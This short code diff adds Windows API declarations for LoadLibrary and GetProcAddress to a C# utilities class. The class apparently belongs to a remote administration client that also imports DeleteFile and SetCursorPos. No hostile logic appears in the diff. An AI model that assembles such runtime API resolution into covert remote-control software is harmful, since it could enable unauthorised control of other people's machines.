@@ -12,6 +12,13 @@ namespace xClient.Core.Utilities
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool DeleteFile(string name);
 
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule,
+        [MarshalAs(UnmanagedType.LPStr)]string procName);
+
         [DllImport("user32.dll")]
         public static extern bool SetCursorPos(int x, int y);
 
